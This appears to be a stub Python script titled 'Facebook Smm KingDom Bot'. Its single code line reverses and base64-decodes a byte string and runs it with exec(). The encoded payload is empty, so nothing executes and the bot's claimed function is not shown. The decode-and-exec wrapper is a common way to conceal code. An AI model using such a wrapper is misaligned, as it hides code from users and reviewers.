# Fares Alex
# Facebook Smm KingDom Bot
# Time: Wed Oct 15 21:16:21 2025
# ----------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))
